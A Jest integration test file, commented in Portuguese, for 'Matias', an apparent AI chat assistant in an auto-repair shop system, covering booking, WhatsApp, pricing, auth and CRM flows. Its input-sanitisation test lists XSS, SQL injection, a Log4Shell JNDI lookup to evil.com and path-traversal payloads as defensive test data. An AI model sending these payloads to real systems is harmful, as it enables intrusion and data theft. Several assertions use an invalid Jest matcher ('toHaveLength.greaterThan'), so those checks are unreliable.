/**
 * 🔗 TESTES DE INTEGRAÇÃO - Sistema Matias
 * 
 * Testes end-to-end para validar a integração completa do Matias
 * com todos os componentes do sistema Ofix
 */

const request = require('supertest');
const app = require('../../ofix-backend/src/app');
const { PrismaClient } = require('@prisma/client');

const prisma = new PrismaClient();

describe('Matias Integration Tests', () => {
  
  beforeAll(async () => {
    // Setup do banco de dados de teste
    await prisma.$connect();
    
    // Criar dados de teste
    await setupTestData();
  });

  afterAll(async () => {
    // Limpeza do banco de dados
    await cleanupTestData();
    await prisma.$disconnect();
  });

  beforeEach(() => {
    // Reset de mocks antes de cada teste
    jest.clearAllMocks();
  });

  describe('🔄 Fluxo Completo de Atendimento', () => {
    test('deve processar atendimento completo desde o chat até agendamento', async () => {
      // 1. Cliente inicia conversa
      const chatResponse = await request(app)
        .post('/api/matias/chat')
        .send({
          message: 'Olá Matias, meu carro está fazendo um barulho estranho no freio',
          language: 'pt-BR'
        })
        .expect(200);

      expect(chatResponse.body.success).toBe(true);
      expect(chatResponse.body.response).toMatch(/freio|barulho|diagnóstico/i);

      // 2. Matias identifica o problema e sugere agendamento
      const diagnosticResponse = await request(app)
        .post('/api/matias/chat')
        .send({
          message: 'Sim, está fazendo barulho quando piso no freio',
          language: 'pt-BR',
          context: { conversation_id: chatResponse.body.conversation_id }
        })
        .expect(200);

      expect(diagnosticResponse.body.suggested_actions).toContain('schedule');

      // 3. Cliente aceita agendamento
      const scheduleResponse = await request(app)
        .post('/api/matias/chat')
        .send({
          message: 'Quero agendar para amanhã de manhã',
          language: 'pt-BR',
          context: { conversation_id: chatResponse.body.conversation_id }
        })
        .expect(200);

      expect(scheduleResponse.body.actions).toContainEqual(
        expect.objectContaining({
          type: 'schedule_creation',
          status: 'completed'
        })
      );

      // 4. Verificar se agendamento foi criado no sistema
      const appointments = await prisma.appointment.findMany({
        where: { conversation_id: chatResponse.body.conversation_id }
      });

      expect(appointments).toHaveLength(1);
      expect(appointments[0].service_type).toContain('freio');
    });

    test('deve integrar com sistema de estoque para verificar peças', async () => {
      const response = await request(app)
        .post('/api/matias/chat')
        .send({
          message: 'Preciso trocar as pastilhas de freio do meu Honda Civic 2020',
          language: 'pt-BR'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.parts_check).toBeDefined();
      expect(response.body.parts_check.availability).toBe(true);
      expect(response.body.parts_check.estimated_price).toMatch(/R\$/);
    });

    test('deve consultar histórico do cliente e personalizar atendimento', async () => {
      // Criar cliente com histórico
      const customer = await prisma.customer.create({
        data: {
          name: 'João Silva',
          phone: '+5511999999999',
          vehicles: {
            create: {
              brand: 'Honda',
              model: 'Civic',
              year: 2020,
              plate: 'ABC1234',
              services: {
                create: {
                  service_type: 'Troca de óleo',
                  date: new Date('2024-01-15'),
                  mileage: 25000
                }
              }
            }
          }
        },
        include: { vehicles: { include: { services: true } } }
      });

      const response = await request(app)
        .post('/api/matias/chat')
        .send({
          message: 'Quando devo fazer a próxima revisão?',
          language: 'pt-BR',
          context: { 
            customer_id: customer.id,
            vehicle_id: customer.vehicles[0].id
          }
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.response).toMatch(/25000|quilometragem|revisão/i);
      expect(response.body.personalized).toBe(true);

      // Limpeza
      await prisma.customer.delete({ where: { id: customer.id } });
    });
  });

  describe('📱 Integração WhatsApp', () => {
    test('deve processar mensagem recebida do WhatsApp', async () => {
      const webhookData = {
        phone: '+5511999999999',
        message: 'Olá, preciso de ajuda com meu carro',
        timestamp: new Date().toISOString(),
        message_id: 'whatsapp_msg_123'
      };

      const response = await request(app)
        .post('/api/matias/whatsapp/webhook')
        .send(webhookData)
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.response_sent).toBe(true);

      // Verificar se a resposta foi enviada
      const conversation = await prisma.conversation.findFirst({
        where: { phone: webhookData.phone },
        include: { messages: true }
      });

      expect(conversation).toBeDefined();
      expect(conversation.messages).toHaveLength(2); // Mensagem recebida + resposta
    });

    test('deve enviar resposta personalizada via WhatsApp', async () => {
      const response = await request(app)
        .post('/api/matias/whatsapp/send')
        .send({
          phone: '+5511999999999',
          message: 'Seu agendamento foi confirmado para amanhã às 9h',
          template: 'appointment_confirmation',
          language: 'pt-BR'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.message_id).toBeDefined();
      expect(response.body.status).toBe('sent');
    });

    test('deve processar comandos de voz via WhatsApp', async () => {
      const audioData = Buffer.from('fake audio data').toString('base64');

      const response = await request(app)
        .post('/api/matias/whatsapp/voice')
        .send({
          phone: '+5511999999999',
          audio: audioData,
          language: 'pt-BR'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.transcription).toBeDefined();
      expect(response.body.ai_response).toBeDefined();
    });
  });

  describe('🔍 Base de Conhecimento', () => {
    test('deve buscar e retornar informações técnicas relevantes', async () => {
      const response = await request(app)
        .get('/api/matias/knowledge/search')
        .query({ 
          q: 'sintomas freio pastilha gasta',
          language: 'pt-BR' 
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.results).toHaveLength.greaterThan(0);
      expect(response.body.results[0]).toHaveProperty('title');
      expect(response.body.results[0]).toHaveProperty('content');
      expect(response.body.results[0]).toHaveProperty('relevance_score');
    });

    test('deve retornar preços atualizados de serviços', async () => {
      const response = await request(app)
        .get('/api/matias/knowledge/pricing')
        .query({ 
          service: 'troca de pastilhas de freio',
          vehicle: 'Honda Civic 2020'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.pricing).toBeDefined();
      expect(response.body.pricing.service_price).toMatch(/R\$/);
      expect(response.body.pricing.parts_price).toMatch(/R\$/);
      expect(response.body.pricing.total_estimate).toMatch(/R\$/);
    });

    test('deve aprender com novas interações', async () => {
      // Simular feedback positivo
      const feedbackResponse = await request(app)
        .post('/api/matias/knowledge/feedback')
        .send({
          conversation_id: 'conv_123',
          message: 'A resposta sobre freios estava perfeita!',
          rating: 5,
          tags: ['freios', 'diagnóstico', 'útil']
        })
        .expect(200);

      expect(feedbackResponse.body.success).toBe(true);
      expect(feedbackResponse.body.learning_updated).toBe(true);

      // Verificar se o conhecimento foi atualizado
      const knowledgeResponse = await request(app)
        .get('/api/matias/knowledge/search')
        .query({ q: 'freios diagnóstico' })
        .expect(200);

      expect(knowledgeResponse.body.results[0].relevance_score).toBeGreaterThan(0.8);
    });
  });

  describe('🔐 Segurança e Autenticação', () => {
    test('deve validar tokens JWT em requisições protegidas', async () => {
      // Sem token
      await request(app)
        .get('/api/matias/admin/stats')
        .expect(401);

      // Token inválido
      await request(app)
        .get('/api/matias/admin/stats')
        .set('Authorization', 'Bearer invalid_token')
        .expect(401);

      // Token válido
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'admin@ofix.com',
          password: 'test_password'
        });

      await request(app)
        .get('/api/matias/admin/stats')
        .set('Authorization', `Bearer ${loginResponse.body.token}`)
        .expect(200);
    });

    test('deve implementar rate limiting por IP', async () => {
      const requests = Array(25).fill().map(() => 
        request(app)
          .post('/api/matias/chat')
          .send({
            message: 'teste rate limit',
            language: 'pt-BR'
          })
      );

      const responses = await Promise.allSettled(requests);
      
      const rateLimitedResponses = responses.filter(
        response => response.value && response.value.status === 429
      );
      
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('deve sanitizar dados de entrada', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE users; --",
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd'
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/matias/chat')
          .send({
            message: input,
            language: 'pt-BR'
          })
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.response).not.toContain('<script>');
        expect(response.body.response).not.toContain('DROP TABLE');
      }
    });
  });

  describe('📊 Monitoramento e Métricas', () => {
    test('deve coletar métricas de performance', async () => {
      const startTime = Date.now();

      await request(app)
        .post('/api/matias/chat')
        .send({
          message: 'Teste de métricas',
          language: 'pt-BR'
        })
        .expect(200);

      const response = await request(app)
        .get('/api/matias/admin/metrics')
        .set('Authorization', 'Bearer valid_admin_token')
        .expect(200);

      expect(response.body.metrics).toHaveProperty('response_time');
      expect(response.body.metrics).toHaveProperty('total_requests');
      expect(response.body.metrics).toHaveProperty('success_rate');
      expect(response.body.metrics.response_time.avg).toBeLessThan(3000);
    });

    test('deve registrar logs de conversas', async () => {
      await request(app)
        .post('/api/matias/chat')
        .send({
          message: 'Mensagem para teste de log',
          language: 'pt-BR'
        })
        .expect(200);

      const logsResponse = await request(app)
        .get('/api/matias/admin/logs')
        .query({ limit: 10 })
        .set('Authorization', 'Bearer valid_admin_token')
        .expect(200);

      expect(logsResponse.body.logs).toHaveLength.greaterThan(0);
      expect(logsResponse.body.logs[0]).toHaveProperty('timestamp');
      expect(logsResponse.body.logs[0]).toHaveProperty('message');
      expect(logsResponse.body.logs[0]).toHaveProperty('response');
    });
  });

  describe('🌐 Suporte Multilíngue', () => {
    test('deve responder consistentemente em diferentes idiomas', async () => {
      const languages = ['pt-BR', 'en', 'es'];
      const greetings = ['Olá Matias', 'Hello Matias', 'Hola Matias'];

      for (let i = 0; i < languages.length; i++) {
        const response = await request(app)
          .post('/api/matias/chat')
          .send({
            message: greetings[i],
            language: languages[i]
          })
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.response).toContain('Matias');
        expect(response.body.detected_language).toBe(languages[i]);
      }
    });

    test('deve manter contexto técnico em tradução', async () => {
      const technicalQueries = [
        { lang: 'pt-BR', message: 'Problema no sistema de freios ABS' },
        { lang: 'en', message: 'ABS brake system problem' },
        { lang: 'es', message: 'Problema en el sistema de frenos ABS' }
      ];

      for (const query of technicalQueries) {
        const response = await request(app)
          .post('/api/matias/chat')
          .send(query)
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.response).toMatch(/ABS|freio|brake|freno/i);
        expect(response.body.technical_terms_preserved).toBe(true);
      }
    });
  });

  describe('🔧 Integração com Sistema Oficina', () => {
    test('deve sincronizar com agenda da oficina', async () => {
      const response = await request(app)
        .post('/api/matias/chat')
        .send({
          message: 'Quero agendar para segunda-feira de manhã',
          language: 'pt-BR'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.schedule_options).toBeDefined();
      expect(response.body.schedule_options.available_slots).toHaveLength.greaterThan(0);
    });

    test('deve consultar disponibilidade de peças em tempo real', async () => {
      const response = await request(app)
        .post('/api/matias/chat')
        .send({
          message: 'Vocês têm filtro de óleo para Corolla 2021?',
          language: 'pt-BR'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.inventory_check).toBeDefined();
      expect(response.body.inventory_check).toHaveProperty('available');
      expect(response.body.inventory_check).toHaveProperty('quantity');
      expect(response.body.inventory_check).toHaveProperty('price');
    });

    test('deve integrar com sistema de CRM', async () => {
      const customerData = {
        name: 'Maria Santos',
        phone: '+5511888888888',
        email: 'maria@example.com'
      };

      const response = await request(app)
        .post('/api/matias/chat')
        .send({
          message: 'Quero cadastrar meu carro para manutenção',
          language: 'pt-BR',
          customer: customerData
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.customer_created).toBe(true);
      expect(response.body.crm_integration).toBe(true);

      // Verificar se foi criado no CRM
      const customer = await prisma.customer.findFirst({
        where: { phone: customerData.phone }
      });

      expect(customer).toBeDefined();
      expect(customer.name).toBe(customerData.name);
    });
  });

  // Funções auxiliares
  async function setupTestData() {
    // Criar dados básicos para testes
    await prisma.knowledgeBase.createMany({
      data: [
        {
          title: 'Sintomas de Pastilhas de Freio Gastas',
          content: 'Barulho ao frear, vibração no pedal, distância de frenagem maior.',
          tags: ['freios', 'pastilhas', 'diagnóstico'],
          language: 'pt-BR'
        },
        {
          title: 'Brake Pad Warning Signs',
          content: 'Squealing noise, vibration in pedal, longer stopping distance.',
          tags: ['brakes', 'pads', 'diagnosis'],
          language: 'en'
        }
      ]
    });

    await prisma.servicePrice.createMany({
      data: [
        {
          service_name: 'Troca de pastilhas de freio',
          base_price: 150.00,
          parts_price: 80.00,
          labor_hours: 1.5,
          vehicle_category: 'sedan'
        },
        {
          service_name: 'Troca de óleo',
          base_price: 60.00,
          parts_price: 45.00,
          labor_hours: 0.5,
          vehicle_category: 'all'
        }
      ]
    });
  }

  async function cleanupTestData() {
    // Limpeza dos dados de teste
    await prisma.conversation.deleteMany({});
    await prisma.appointment.deleteMany({});
    await prisma.knowledgeBase.deleteMany({});
    await prisma.servicePrice.deleteMany({});
    await prisma.customer.deleteMany({});
  }
});

// Configuração de timeout para testes de integração
jest.setTimeout(30000);
